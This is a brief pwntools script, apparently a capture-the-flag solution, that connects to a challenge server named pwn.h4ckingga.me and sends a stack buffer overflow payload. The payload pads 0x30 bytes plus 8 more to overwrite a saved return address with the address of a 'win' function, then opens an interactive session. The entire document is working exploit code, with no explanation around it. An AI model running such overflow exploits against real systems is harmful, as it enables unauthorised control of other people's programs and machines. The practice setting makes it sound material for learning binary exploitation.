from pwn import *
# nc pwn.h4ckingga.me 10001
p = remote('pwn.h4ckingga.me', 10001)
# p = process('./welcome')

win = 0x4006c7

p.recvuntil("?\n")

pay = b'a' * 0x30 + b'x' * 8 + p64(win)

p.send(pay)

p.interactive()